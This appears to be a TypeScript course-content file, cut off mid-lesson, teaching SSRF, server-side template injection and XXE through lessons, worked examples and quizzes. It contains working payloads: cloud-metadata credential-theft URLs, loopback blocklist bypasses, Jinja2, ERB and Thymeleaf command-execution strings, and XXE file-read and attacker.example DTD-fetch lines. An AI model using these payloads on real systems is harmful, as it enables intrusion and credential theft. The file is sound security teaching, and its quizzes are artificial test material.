import type { Unit } from "../types";

const unit7: Unit = {
  id: "advanced-web",
  index: 7,
  title: "Advanced Web: SSRF, SSTI, XXE, Upload",
  tagline: "The high-impact bug classes that chain into RCE.",
  tone: "offense",
  lessons: [
    {
      id: "ssrf",
      title: "SSRF",
      summary: "Make the server fetch things it shouldn't.",
      cards: [
        {
          title: "Objective",
          kind: "objective",
          body: [
            "By the end of this lesson you can: explain what a server-side request is and why some apps make them on your behalf, identify features likely to be vulnerable to Server-Side Request Forgery (SSRF), redirect such a feature at an internal/cloud-metadata target, and explain how to confirm a blind SSRF with an out-of-band (OOB) listener.",
          ],
        },
        {
          title: "Normal operation: why servers fetch URLs for you",
          kind: "intuition",
          body: [
            "Many legitimate features ask the *server* — not your browser — to go fetch a URL and do something with the result: an 'import avatar from URL' button, a webhook that POSTs your data to a URL you register, a PDF generator that renders a web page, a link-preview card that shows a thumbnail of a URL you paste into a chat.",
            "Analogy: you hand a letter with an address on it to a company's internal courier, and the courier walks it over and brings back a reply. That's useful — you don't want to run your own courier network. The courier is the server; the address is the URL.",
            "Where the analogy breaks: a human courier recognises 'this address is inside our own building, I shouldn't deliver outsider mail there.' A naive server does not. It will fetch any URL handed to it, including addresses that point back at itself, at other machines on its private network, or at special cloud-only addresses — unless the developer explicitly restricts where it is allowed to go.",
          ],
          tone: "info",
        },
        {
          title: "Prerequisites: localhost, private IP ranges, and cloud metadata",
          kind: "prereq",
          body: [
            "127.0.0.1 ('localhost') always refers to the machine making the request — if the *server* requests it, the server talks to itself, not to you.",
            "Private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) are not reachable from the public internet; they only exist inside an organisation's internal network. A server sitting inside that network CAN reach them, even though you, the external attacker, cannot reach them directly.",
            "Cloud providers run an internal-only HTTP service called the instance metadata service (IMDS) at the fixed address 169.254.169.254, reachable only from inside a cloud VM. It answers plaintext HTTP GETs with information about the VM, including temporary IAM/service-account credentials that let code on that VM call cloud APIs (read S3 buckets, list databases, etc.).",
            "If you have not done the earlier networking unit's IP/subnet lesson, note only this: an address like 169.254.169.254 or 127.0.0.1 is meaningless as 'a website' — it identifies a location on a specific machine's network interface, and whether it's reachable depends entirely on where the request originates from.",
          ],
        },
        {
          title: "The failure: redirecting the fetch",
          kind: "explain",
          body: [
            "SSRF happens when a feature that performs a server-side fetch lets the attacker control (fully or partially) the destination URL, and the server does not verify that the destination is safe to reach before connecting.",
            "Mechanism: you supply a URL in a parameter the import/webhook/preview feature consumes. The server's HTTP client (not your browser) opens a TCP connection to whatever host that URL resolves to and sends the request. If that host is 169.254.169.254 or an internal service, the server just talks to it like any other URL — it has no inherent concept of 'this destination is dangerous for me specifically.'",
            "Two observable flavours: (1) **reflected/visible SSRF** — the fetched content (or part of it) is shown back to you, e.g. the 'imported image' renders, or an error message includes response text; (2) **blind SSRF** — the server fetches the URL but never shows you anything, so you must prove the fetch happened some other way.",
          ],
          code: `# AWS instance metadata (IMDSv1 - still common on legacy instances)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
\u2192 returns temporary AWS access keys for the instance's IAM role.

# GCP metadata (requires a header the attacker must also smuggle in)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
   (requires Metadata-Flavor: Google header)

# internal services only reachable from inside the network
http://localhost:9200/_cat/indices       (Elasticsearch, no auth by default)
http://127.0.0.1:8500/v1/kv/?recurse     (Consul key-value store)
http://localhost:6379/                   (Redis, often reachable via gopher://)`,
          tone: "offense",
          check: {
            type: "mc",
            q: "An 'import profile picture from URL' feature fetches server-side. Why is this a DIFFERENT risk from you simply visiting the URL in your own browser?",
            options: [
              "It isn't different \u2014 the risk is identical either way",
              "The server, not your browser, makes the request, so it can reach internal/cloud-only addresses your browser never could",
              "Server-side fetches are always encrypted with TLS",
              "The server always refuses to fetch private IP addresses",
            ],
            answer: 1,
            why: [
              "The whole point of SSRF is that the trust boundary moves: the request now originates from the server's network position, not yours.",
              "Correct \u2014 the server sits inside the private network / cloud VM, so it can reach 169.254.169.254 and 10.x addresses you could never reach directly from outside.",
              "TLS has nothing to do with whether the destination is internal.",
              "Nothing stops it by default; blocking requires explicit developer effort, which is the whole vulnerability.",
            ],
            explain:
              "SSRF is dangerous specifically because the server is a trusted insider on its own network. Redirecting its outbound fetch borrows that position.",
            hints: ["Think about *where* the HTTP client process is physically/logically running.", "Your browser cannot route to 169.254.169.254 inside someone else's cloud VM \u2014 but their own server can."],
            ref: "The failure: redirecting the fetch",
          },
        },
        {
          title: "Worked example: from feature to stolen cloud credentials",
          kind: "example",
          body: [
            "Scenario: shop.example has an 'import product image from URL' feature. You test it step by step.",
            "Step 1 \u2014 baseline: submit a normal public image URL and confirm the feature works and that, in the response, the server tells you the image size it fetched. This proves the server is making the request itself (not redirecting your browser), because your browser could not have reported the fetched size without the server doing the work.",
            "Step 2 \u2014 probe internal range: submit http://127.0.0.1:9200/_cat/indices. The app returns 'blocked host' \u2014 so there IS a blocklist checking the literal string 127.0.0.1/localhost.",
            "Step 3 \u2014 bypass with an equivalent address: submit http://169.254.169.254/latest/meta-data/ directly \u2014 the blocklist only covers loopback, not the cloud metadata range, and it responds 200 with a directory listing. This confirms SSRF against the metadata service specifically.",
            "Step 4 \u2014 pivot to credentials: request /latest/meta-data/iam/security-credentials/ to get the role name, then /latest/meta-data/iam/security-credentials/<role-name> to receive a JSON blob with AccessKeyId, SecretAccessKey and a session Token \u2014 valid cloud credentials, obtained purely by making the server fetch a URL.",
            "WHY each step matters: step 1 establishes the fetch is server-side (necessary condition for SSRF to even be possible); step 2 tells you a defence exists so you must find what it does NOT cover; step 3 is the actual confirmed vulnerability; step 4 demonstrates concrete impact rather than stopping at 'it fetched something'.",
          ],
          code: `POST /import HTTP/1.1
Host: shop.example

url=http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-import-role

HTTP/1.1 200 OK
{"AccessKeyId":"AKIAIMPORTEXAMPLE1","SecretAccessKey":"wJalr...FAKE","Token":"IQoJ..."}`,
          tone: "offense",
          check: {
            type: "order",
            q: "Order the SSRF-to-credential-theft steps from this worked example.",
            items: [
              "Confirm the feature performs a server-side fetch (baseline public URL)",
              "Probe a blocked internal address to learn the blocklist exists",
              "Find an unblocked equivalent (the metadata address) and get a 200 response",
              "Request the IAM role name, then the named role, to receive temporary credentials",
            ],
            explain:
              "Each step narrows down: is this SSRF at all? -> what's defended? -> what's not defended? -> what's the actual impact?",
            hints: ["Start from 'does the server even fetch for me'.", "Blockers teach you about scope before bypasses do."],
            ref: "Worked example: from feature to stolen cloud credentials",
          },
        },
        {
          title: "Bypasses when there's a blocklist, and confirming blind SSRF",
          kind: "explain",
          body: [
            "Blocklists for 'localhost'/'127.0.0.1' are commonly incomplete because the same address can be written many equivalent ways: decimal integer (2130706433), octal (0177.0.0.1), IPv6 loopback ([::1]), or a public DNS name that simply resolves to 127.0.0.1 (e.g. localtest.me). A blocklist matching only the literal string 'localhost' misses all of these.",
            "DNS rebinding is a more advanced bypass: the attacker's own domain first resolves to a harmless IP (passing any validation check), then the DNS answer is changed to point at an internal IP by the time the server actually connects \u2014 defeating 'check-then-use' validation.",
            "When the response is never shown to you (blind SSRF), you cannot just look at the page. Instead you point the vulnerable parameter at a unique subdomain you control (an OOB/\u2018Collaborator\u2019 style listener) and watch your own DNS/HTTP logs. If your listener receives a lookup or request a few seconds after you submit the payload, that proves the server made an outbound connection \u2014 independent confirmation that does not rely on seeing any content.",
          ],
          code: `# equivalent-but-not-literally-"127.0.0.1" tricks
http://127.1
http://2130706433
http://0177.0.0.1
http://[::1]
http://<unique-id>.oast.example   (your OOB listener domain)`,
          tone: "offense",
        },
        {
          title: "Common mistakes",
          kind: "mistakes",
          body: [
            "Mistake: assuming 'the feature returned 400 Bad Request for localhost, so SSRF is fixed.' A blocklist that catches one string form of an address is not evidence every equivalent form is blocked \u2014 you must test the alternate encodings before concluding it's safe.",
            "Mistake: treating 'the server made a DNS lookup to my domain' and 'the server read sensitive internal data' as the same severity. A bare OOB hit proves SSRF exists; it does NOT by itself prove you can reach a juicy internal service or exfiltrate data \u2014 that's a separate step to demonstrate.",
            "Mistake: confusing SSRF with an open redirect. An open redirect makes the VICTIM's browser navigate somewhere else; SSRF makes the SERVER itself issue a request. They look superficially similar ('a URL parameter sends me elsewhere') but the party doing the connecting, and therefore the impact, is completely different.",
          ],
        },
        {
          title: "Guided practice",
          kind: "practice",
          body: [
            "A 'webhook URL' feature on notes.example lets you register a URL that gets POSTed every time you save a note. Submitting http://localhost:6379/ returns 'Error: destination blocked'. Submitting http://127.0.0.1:6379/ returns the same error. What single-value payload is most likely to bypass this blocklist and still reach the same Redis instance at 127.0.0.1:6379, and how would you confirm it worked if the webhook response body is never shown to you?",
          ],
          check: {
            type: "fill",
            q: "Give one decimal or alternate-encoding form of 127.0.0.1 that a naive string blocklist for 'localhost'/'127.0.0.1' would likely miss.",
            answers: ["2130706433", "0177.0.0.1", "127.1", "[::1]", "::1"],
            explain:
              "2130706433 is the 32-bit decimal form of 127.0.0.1; 0177.0.0.1 is octal; 127.1 is a shorthand the OS still resolves to loopback; [::1] is the IPv6 loopback address. A blocklist only matching the literal strings 'localhost' or '127.0.0.1' misses all of these, because to the server's HTTP/DNS stack they all resolve to the same destination.",
            hints: [
              "Think of 127.0.0.1 as just a 32-bit number \u2014 what's its decimal form?",
              "IPv6 has its own loopback address, written differently from IPv4's.",
            ],
            ref: "Bypasses when there's a blocklist, and confirming blind SSRF",
          },
        },
        {
          title: "Practical relevance: what SSRF confirmation does and does not prove",
          kind: "relevance",
          body: [
            "In authorised testing, SSRF matters because it lets an external attacker borrow the server's network position to reach things that were never meant to be internet-facing \u2014 cloud credential theft via IMDS is one of the highest-impact, most common real-world chains.",
            "An OOB callback or a 200 response from an internal address CONFIRMS the server made the request you asked it to. It does NOT by itself prove you can read a specific file, obtain working credentials, or pivot further \u2014 you must demonstrate each additional step (e.g. actually retrieving and testing the leaked credentials in-scope) before claiming that impact in a report.",
            "Only test against systems and URL destinations explicitly covered by your authorisation; never point a client's SSRF-vulnerable feature at a third party's infrastructure, since that would be an unauthorised request to a system that never agreed to be tested.",
          ],
        },
      ],
      exercises: [
        {
          type: "mc",
          q: "An 'import from URL' feature runs inside an AWS EC2 instance. You want the single highest-value first probe for SSRF impact. Which URL?",
          options: [
            "http://google.com",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://localhost:3306",
            "http://[::1]:22",
          ],
          answer: 1,
          why: [
            "This just confirms the server can reach the public internet, which it almost certainly already can \u2014 it tells you nothing about SSRF.",
            "Correct. On IMDSv1 (still common on legacy instances) this endpoint leaks the IAM role name, the first step toward full credentials.",
            "Port 3306 is a database port; even if reachable, you have no credentials for it yet, and it doesn't confirm metadata access.",
            "SSH is rarely useful without credentials, and this doesn't target the metadata service at all.",
          ],
          explain:
            "The IMDS endpoint is the highest-value first probe in a cloud environment because reaching it typically yields usable cloud credentials with a clear, demonstrable impact, which is exactly what the lesson's worked example walked through.",
          hints: ["Which internal address is specific to cloud VMs and known to leak credentials?", "Recall the worked example's step 3\u20134."],
          ref: "Worked example: from feature to stolen cloud credentials",
        },
        {
          type: "mc",
          q: "The response body of the 'import from URL' feature is never shown back to you. How do you confirm SSRF exists at all?",
          options: [
            "Give up \u2014 blind SSRF cannot be confirmed",
            "Point the fetch at a unique OOB (Collaborator-style) domain you control and watch for a DNS/HTTP callback",
            "Rely on response timing differences alone, with no other evidence",
            "Assume it exists because the feature accepts a URL parameter",
          ],
          answer: 1,
          why: [
            "Blind bugs are confirmable \u2014 you just need an out-of-band channel, not the in-band response.",
            "Correct \u2014 an OOB hit is independent proof the server issued the request, regardless of what it shows you.",
            "Timing alone is weak, ambiguous evidence and should only ever support a stronger OOB-based confirmation, not replace it.",
            "Accepting a URL parameter is necessary but not sufficient evidence \u2014 the server might still validate or block the destination.",
          ],
          explain:
            "Collaborator-style listeners give you a unique domain that logs any DNS lookup or HTTP hit \u2014 the gold-standard confirmation technique for bugs with no visible response.",
          hints: ["What's the difference between a feature accepting a URL and a feature actually being exploitable?"],
          ref: "Bypasses when there's a blocklist, and confirming blind SSRF",
        },
        {
          type: "fill",
          q: "A server blocks requests to the literal strings 'localhost' and '127.0.0.1'. Name the decimal 32-bit integer equivalent of 127.0.0.1 that likely bypasses this check.",
          answers: ["2130706433"],
          explain:
            "127.0.0.1 as a 32-bit integer is 2130706433 (127\u00d716777216 + 0\u00d765536 + 0\u00d7256 + 1). Most HTTP clients will happily resolve http://2130706433 to the same loopback address.",
          hints: ["127.0.0.1 is really four 8-bit numbers combined into one 32-bit number.", "127 \u00d7 256\u00b3 + 1 = ?"],
          ref: "Bypasses when there's a blocklist, and confirming blind SSRF",
        },
        {
          type: "mc",
          q: "You confirm an OOB DNS callback from a webhook feature when you point it at your Collaborator domain. A teammate says 'great, we can now read the admin database.' What's wrong with that conclusion?",
          options: [
            "Nothing \u2014 an OOB hit proves full database read access",
            "An OOB hit only proves the server made an outbound request; reaching and reading a specific internal service is a separate step that still needs to be demonstrated",
            "OOB hits are unreliable and should never be used as evidence",
            "The teammate is correct because all internal services are reachable once SSRF is confirmed",
          ],
          answer: 1,
          why: [
            "This overclaims \u2014 an OOB hit says nothing about which other internal hosts/ports are reachable or whether they expose data.",
            "Correct \u2014 this is the mistakes-section distinction: confirming the request happened is not the same as confirming a specific downstream impact.",
            "OOB hits are in fact a reliable, industry-standard confirmation technique; the problem here is overclaiming impact, not the technique itself.",
            "Reachability and the presence of exploitable, unauthenticated data at a given internal service are never guaranteed just because outbound SSRF works once.",
          ],
          explain:
            "This mirrors the 'common mistakes' point: proving SSRF exists and proving a specific high-impact outcome are two different claims, each needing its own evidence.",
          hints: ["Re-read the Common mistakes card about OOB hits vs internal data access."],
          ref: "Common mistakes",
        },
        {
          type: "mc",
          q: "Which scenario is SSRF rather than an open redirect?",
          options: [
            "Clicking a link on site A sends your browser to site B",
            "A PDF-generation feature on the server fetches and renders whatever URL you supply, including internal addresses",
            "A logout page redirects your browser back to the login page",
            "A 'next' parameter sends your browser to an external domain after login",
          ],
          answer: 1,
          why: [
            "This is a classic open redirect \u2014 the browser, not the server, navigates.",
            "Correct \u2014 the server's own HTTP client performs the fetch, which is the defining trait of SSRF.",
            "Ordinary redirect behaviour with no security implication described here.",
            "This is an open redirect pattern, often chained with OAuth issues, but it is the browser that moves, not the server.",
          ],
          explain:
            "The distinguishing fact is who makes the network connection: your browser (open redirect) vs. the server itself (SSRF).",
          hints: ["Ask: which machine actually opens the outbound TCP connection \u2014 the victim's browser, or the backend server?"],
          ref: "Common mistakes",
        },
      ],
    },
    {
      id: "ssti",
      title: "SSTI: server-side template injection",
      summary: "When the template engine evaluates attacker input.",
      cards: [
        {
          title: "Objective",
          kind: "objective",
          body: [
            "By the end of this lesson you can: explain what a server-side template engine normally does, recognise when user input is unsafely placed inside a template, run the universal SSTI confirmation probe, and explain why SSTI frequently escalates to remote code execution (RCE).",
          ],
        },
        {
          title: "Normal operation: templates generate HTML from data",
          kind: "intuition",
          body: [
            "A template engine (Jinja2, ERB, Twig, Thymeleaf, etc.) lets developers write an HTML skeleton with placeholders, e.g. 'Hello, {{name}}!', and have the server fill in real values at request time \u2014 this is how almost every dynamic web page is built without hand-concatenating strings.",
            "Analogy: a mail-merge template. You write one letter with '[FIRST NAME]' placeholders and the software fills in a thousand different names from a spreadsheet. Normal operation: the engine only ever substitutes DATA into the placeholders \u2014 it does not expect the spreadsheet cell to contain more mail-merge instructions.",
            "Where it breaks: if the developer builds the TEMPLATE STRING ITSELF by concatenating user input (rather than only ever passing user input in AS data to fill a placeholder), the engine will parse and execute any template syntax the attacker includes, not just plain text.",
          ],
          tone: "info",
        },
        {
          title: "Prerequisites: data vs. code, and what 'templating' and 'evaluate' mean",
          kind: "prereq",
          body: [
            "'Data' is a value to be displayed as-is (e.g. the text 'Alice'). 'Code'/'template syntax' is an instruction the engine executes (e.g. {{7*7}} tells the engine to compute 7 times 7). Safe template use only ever lets user input become data, never part of the instructions.",
            "'Evaluate' here means: the engine actively parses the {{ ... }} content as an expression and runs it, rather than printing the characters literally. This is exactly the same root cause pattern as SQL injection from earlier in the course (user input is mistakenly treated as part of the instructions, not just as a value) \u2014 only the 'instructions' here are template expressions instead of SQL statements.",
          ],
        },
        {
          title: "The failure: user input becomes template source",
          kind: "explain",
          body: [
            "SSTI happens when the application does something like `render_template_string(\"Hello \" + user_input)` instead of `render_template(\"hello.html\", name=user_input)`. The first concatenates user input directly into the TEMPLATE SOURCE before the engine even starts parsing; the second passes user input only as a DATA value the engine substitutes into an existing placeholder.",
            "Once your input is part of the template source, the engine's parser treats your {{ ... }} syntax as a real expression to evaluate, not as literal text to print. Template engines are often full programming-language-like environments (they can call functions, access objects, import modules) \u2014 which is why the blast radius extends past 'display the wrong text' all the way to running operating-system commands.",
          ],
          code: `# Jinja2 (Python / Flask) \u2014 VULNERABLE pattern
return render_template_string("Hello " + request.args.get("name"))
#        vs the SAFE pattern:
return render_template("hello.html", name=request.args.get("name"))

# if vulnerable:
?name={{7*7}}        \u2192 page shows "Hello 49"       (confirmed SSTI)
?name={{config}}      \u2192 leaks entire app config/secrets
?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}  \u2192 RCE`,
          tone: "offense",
          check: {
            type: "mc",
            q: "Which of these two code patterns is vulnerable to SSTI, and why?",
            options: [
              "render_template(\"hello.html\", name=user_input) \u2014 because templates are always dangerous",
              "render_template_string(\"Hello \" + user_input) \u2014 because user input becomes part of the template source before parsing",
              "Both are equally vulnerable",
              "Neither is vulnerable; SSTI requires a database",
            ],
            answer: 1,
            why: [
              "This is the SAFE pattern \u2014 user input is passed only as a data value for an existing placeholder, never parsed as template syntax.",
              "Correct \u2014 concatenating user input into the template string means the engine's parser will treat any {{ }} syntax in it as a real expression.",
              "Only the concatenation pattern is vulnerable; the placeholder-substitution pattern is the standard safe approach.",
              "SSTI is purely about template engines and has nothing to do with databases.",
            ],
            explain:
              "The deciding factor is whether user input ever becomes part of the TEMPLATE SOURCE (parsed as code) versus staying a DATA value substituted into an existing placeholder.",
            hints: ["Compare where user_input sits relative to the template string in each line.", "Does the engine parse user_input as instructions, or just print it?"],
            ref: "The failure: user input becomes template source",
          },
        },
        {
          title: "Worked example: confirming the engine and reaching RCE",
          kind: "example",
          body: [
            "Scenario: a feedback form on notes.example reflects your name into a 'Thank you, <name>' page. You suspect SSTI.",
            "Step 1 \u2014 universal probe: submit name={{7*7}}. The page shows 'Thank you, 49'. WHY this step: it distinguishes SSTI from ordinary reflected XSS \u2014 an XSS-vulnerable-but-not-SSTI-vulnerable app would show the literal text '{{7*7}}' unevaluated, because it never passes through a template parser as code.",
            "Step 2 \u2014 identify the engine: different template engines have different syntax families and object models, so before trying an RCE payload you check response headers/error pages (e.g. a Flask 500 error naming Jinja2) or test engine-distinctive syntax ({{7*'7'}} evaluates to '7777777' in Jinja2's Python semantics but would error in other engines). WHY: RCE payloads are engine-specific; guessing blind wastes requests and may trip alerts.",
            "Step 3 \u2014 escalate carefully, inside the authorised lab only: once the engine is confirmed as Jinja2, you use a known Jinja2 sandbox-escape payload that walks Python's object model (__init__.__globals__...) to reach the os module and run a command, confirming RCE by observing the command's output reflected in the response.",
            "Step 4 \u2014 record evidence: capture the exact request/response pair for {{7*7}}\u219249 as proof of evaluation, and the exact RCE payload and output, rather than merely stating 'SSTI found.'",
          ],
          code: `# ERB (Rails)
<%= 7*7 %>        \u2192 49
<%= \\\`id\\\` %>

# Twig (PHP)
{{7*7}} \u2192 49

# Thymeleaf (Java)
__\\\${T(java.lang.Runtime).getRuntime().exec("id")}__::.x`,
          tone: "offense",
          check: {
            type: "mc",
            q: "A reflected-input page shows the literal text '{{7*7}}' on screen, not '49'. What does this tell you?",
            options: [
              "SSTI is confirmed",
              "The input is probably NOT passed through a template parser as code \u2014 SSTI is not confirmed by this test",
              "The template engine crashed",
              "RCE is already achieved",
            ],
            answer: 1,
            why: [
              "Evaluation (producing 49) is what confirms SSTI, not merely accepting the characters.",
              "Correct \u2014 if the engine evaluated it, you'd see the computed result, not the literal braces; seeing literal text means it was only ever treated as plain data/text.",
              "Showing literal text is normal, safe behaviour, not a crash.",
              "RCE requires evaluation first; literal text output rules it out at this probe stage.",
            ],
            explain:
              "The {{7*7}} probe relies on the fact that evaluated output (49) looks nothing like the unevaluated input ({{7*7}}), making the result unambiguous.",
            hints: ["What would the page show if the engine actually evaluated your expression?"],
            ref: "Worked example: confirming the engine and reaching RCE",
          },
        },
        {
          title: "Common mistakes",
          kind: "mistakes",
          body: [
            "Mistake: treating any reflected input as SSTI just because it 'looks like' it might go through a template. Only a literal evaluated result (49, not {{7*7}}) is confirmation; reflected text alone could just be ordinary (and separately concerning) reflected XSS.",
            "Mistake: jumping straight to an RCE payload copied from a write-up without first identifying the engine. Payloads are engine-specific (Jinja2's object-model walk will not work against Twig), so an untailored payload failing does NOT mean the app is safe \u2014 it may just mean you used the wrong engine's syntax.",
            "Mistake: assuming SSTI always leads to RCE. Some engines or sandboxed configurations restrict what expressions can access; evaluation of arithmetic (confirmed SSTI) is a different claim from confirmed RCE, and a report should not conflate the two without separately demonstrating command execution.",
          ],
        },
        {
          title: "Guided practice",
          kind: "practice",
          body: [
            "A 'search' feature on blog.example reflects your query into the results page. Submitting ?q=test shows 'No results for test'. You want to check for SSTI without yet trying to achieve RCE. What exact probe value should you submit, and what TWO distinct outcomes would respectively confirm and rule out SSTI?",
          ],
          check: {
            type: "fill",
            q: "What is the universal first SSTI probe string?",
            answers: ["{{7*7}}", "7*7"],
            explain:
              "Submitting {{7*7}} and seeing '49' in the response confirms the engine is evaluating your input as code; seeing the literal text '{{7*7}}' means it is not (ruling out SSTI, though other bug classes may still apply).",
            hints: ["It's the same probe used throughout this lesson's worked example.", "Think of the simplest arithmetic expression inside the engine's placeholder syntax."],
            ref: "Worked example: confirming the engine and reaching RCE",
          },
        },
        {
          title: "Practical relevance: what the probe proves, and scope",
          kind: "relevance",
          body: [
            "In authorised testing, confirming SSTI via {{7*7}}\u219249 is valuable because it is a clean, low-risk way to prove the engine evaluates attacker input \u2014 a necessary precondition for the (often critical) RCE impact that follows.",
            "The {{7*7}} result PROVES expression evaluation. It does NOT by itself prove remote code execution \u2014 that requires a further, engine-specific payload, run only against in-scope targets, and ideally using a low-risk command (like `id` or `whoami`) rather than anything destructive, to demonstrate impact safely.",
            "Never run destructive or data-exfiltrating commands during a proof-of-concept; a single safe command's output is normally sufficient evidence for a report.",
          ],
        },
      ],
      exercises: [
        {
          type: "fill",
          q: "What is the universal first SSTI probe?",
          answers: ["{{7*7}}", "7*7"],
          explain: "Response containing 49 = SSTI confirmed (engine evaluated it). Response containing the literal braces = not confirmed.",
          hints: ["Review 'Worked example: confirming the engine and reaching RCE', step 1."],
          ref: "Worked example: confirming the engine and reaching RCE",
        },
        {
          type: "mc",
          q: "Which code pattern is safe from SSTI even though it also uses a template engine?",
          options: [
            "render_template_string(\"Hi \" + name)",
            "render_template_string(name)",
            "render_template(\"hello.html\", name=name)",
            "eval(\"Hi \" + name)",
          ],
          answer: 2,
          why: [
            "Still concatenates user input into the template source before parsing \u2014 vulnerable.",
            "The entire template source is attacker-controlled here, which is even worse.",
            "Correct \u2014 user input is passed only as a data value for an existing placeholder, never parsed as template syntax.",
            "This isn't a templating function at all, and eval'ing user input directly is its own severe vulnerability.",
          ],
          explain: "Safety depends on whether user input ever becomes part of the parsed template source, not merely on 'using a template engine.'",
          hints: ["Which option keeps the template string fixed and only substitutes a value afterwards?"],
          ref: "The failure: user input becomes template source",
        },
        {
          type: "mc",
          q: "You submit {{7*7}} to a form field and get back '49'. A teammate says this already proves remote code execution. What's the correct correction?",
          options: [
            "Correct, {{7*7}}=49 is RCE",
            "No \u2014 it proves the engine evaluates expressions (SSTI), but RCE requires a further, engine-specific payload that actually executes an OS command",
            "No \u2014 {{7*7}} never indicates any vulnerability at all",
            "No \u2014 it only proves the server is slow",
          ],
          answer: 1,
          why: [
            "Arithmetic evaluation and OS command execution are different, separately demonstrated capabilities.",
            "Correct \u2014 this is the exact mistake called out in 'Common mistakes': confirmed SSTI is not automatically confirmed RCE.",
            "It does indicate a real finding (confirmed expression evaluation), just not yet RCE.",
            "This has nothing to do with timing/performance.",
          ],
          explain: "Confirmed evaluation (SSTI) is a prerequisite for RCE but is not itself proof of code execution \u2014 that needs its own payload and evidence.",
          hints: ["Re-read 'Common mistakes' about assuming SSTI always leads to RCE."],
          ref: "Common mistakes",
        },
        {
          type: "mc",
          q: "A Jinja2-specific RCE payload fails against a target. What is the most reasonable next step, given this lesson?",
          options: [
            "Conclude the app has no SSTI vulnerability",
            "Try to confirm which template engine is actually in use, then use a payload matching that engine's syntax",
            "Repeat the exact same Jinja2 payload many times",
            "Give up on SSTI and move to a different bug class immediately",
          ],
          answer: 1,
          why: [
            "A failed engine-specific payload doesn't rule out SSTI on a different engine \u2014 overclaiming 'safe' here is the mistake called out in the lesson.",
            "Correct \u2014 payloads are engine-specific; if {{7*7}} already confirmed evaluation, the next step is identifying the actual engine.",
            "Repetition won't help if the syntax is simply wrong for this engine.",
            "Premature \u2014 you haven't yet identified the engine, which is a reasonable and fast next step.",
          ],
          explain: "This reinforces the worked example's step 2: identify the engine before choosing an RCE payload, since engines are not interchangeable.",
          hints: ["Recall 'Worked example' step 2 about engine identification."],
          ref: "Worked example: confirming the engine and reaching RCE",
        },
      ],
    },
    {
      id: "xxe-upload-deser",
      title: "XXE, uploads, deserialization",
      summary: "Three more routes to high-severity findings.",
      cards: [
        {
          title: "Objective",
          kind: "objective",
          body: [
            "By the end of this lesson you can: explain how an XML parser's entity feature normally works and how it's abused for file read/SSRF, describe the upload-processing pipeline and where filename/content checks can be bypassed, and recognise serialized-object formats that indicate a possible insecure-deserialization RCE.",
          ],
        },
        {
          title: "Prerequisites: what XML entities, file uploads, and serialization normally do",
          kind: "prereq",
          body: [
            "XML is a text format for structured data, used by SOAP APIs, SAML single sign-on, and some document formats (DOCX/SVG are ZIP/XML under the hood). XML supports 'entities' \u2014 reusable text shortcuts declared once and referenced many times, similar to a find-and-replace macro, e.g. declaring &amp;company; once to stand for a long name used repeatedly in the document. This is a real, intended feature.",
            "File upload is the normal flow: browser sends a file in a multipart POST \u2192 server validates it (filename, size, type) \u2192 server stores it (disk/bucket) \u2192 server later serves it back when requested.",
            "Serialization is turning an in-memory object (with its class and field values) into a byte stream for storage or transmission, and deserialization is reconstructing the object from those bytes. Many languages (Java, PHP, .NET, Python's pickle) support this natively so an app can, for example, save a shopping-cart object into a cookie and reconstruct it on the next request.",
          ],
        },
        {
          title: "XXE: when the entity feature reads local files",
          kind: "explain",
          body: [
            "Normal XML entities only reference text already inside the document. An XML eXternal Entity (XXE) is a variant where the entity's content is loaded from an EXTERNAL source \u2014 a local file path or even a URL \u2014 rather than being written inline. This is a legitimate part of the XML specification, meant for including shared boilerplate.",
            "The failure: if a parser has external entities enabled (many do by default on older libraries) and processes attacker-supplied XML, the attacker can declare an entity pointing at a sensitive local file (file:///etc/passwd) or an internal URL, and reference that entity somewhere the parser outputs it back \u2014 turning an XML upload field into an arbitrary local-file-read or SSRF primitive.",
            "Any endpoint accepting XML is in scope, including ones that don't look obviously XML-based: DOCX/XLSX uploads, SVG image uploads, SAML login assertions, SOAP API calls.",
          ],
          code: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
<!-- if the app echoes the <data> field back, /etc/passwd's contents appear in the response -->

<!-- Blind XXE: the entity's result is never shown back, so define a parameter entity
     that forces the parser to fetch your attacker-controlled DTD out-of-band instead -->
<!DOCTYPE foo [<!ENTITY % x SYSTEM "http://attacker.example/x.dtd"> %x;]>`,
          tone: "offense",
          check: {
            type: "mc",
            q: "Why can an SVG image-upload feature be vulnerable to XXE even though it 'looks like' an image upload, not an XML upload?",
            options: [
              "SVG files are binary and unrelated to XML",
              "SVG is itself an XML-based format, so an SVG parser is an XML parser and can be vulnerable to the same external entity abuse",
              "Image uploads are never parsed server-side",
              "XXE only affects .xml file extensions",
            ],
            answer: 1,
            why: [
              "SVG is actually a plain-text XML format, not binary.",
              "Correct \u2014 under the hood, an SVG file IS an XML document, so anything that parses SVG is running XML parsing logic.",
              "Servers commonly parse/resize/validate uploaded images, including SVGs, which is exactly where the risk appears.",
              "Vulnerability depends on the underlying parser and content, not the file extension.",
            ],
            explain: "This is exactly the point in the lesson: XXE-relevant endpoints are often disguised as DOCX, SVG, SAML or SOAP processing rather than an obvious '.xml' upload.",
            hints: ["What format is SVG actually built on, underneath the image rendering?"],
            ref: "XXE: when the entity feature reads local files",
          },
        },
        {
          title: "Worked example: confirming and validating an XXE file read",
          kind: "example",
          body: [
            "Scenario: notes.example accepts XML import for bulk note creation and echoes the parsed note content on screen.",
            "Step 1 \u2014 baseline: submit a normal, valid XML note and confirm it's parsed correctly, establishing the app really does feed your XML to a parser (not just storing it as a blob).",
            "Step 2 \u2014 declare a local entity: submit the payload with <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> and reference &xxe; inside the note body field that gets echoed.",
            "Step 3 \u2014 observe: the response shows the contents of /etc/passwd where the note text should be. WHY this confirms it: /etc/passwd is a well-known file with a predictable, recognisable structure (lines like root:x:0:0:...), so an unexpected appearance of that exact structure is strong, specific evidence \u2014 not just 'some text changed.'",
            "Step 4 \u2014 if nothing is echoed back (blind case): switch to the parameter-entity technique that fetches an attacker-hosted DTD, and confirm via an OOB hit on your own listener (same OOB validation concept as the SSRF lesson) rather than concluding 'no vulnerability' from a blank response.",
          ],
          tone: "offense",
          check: {
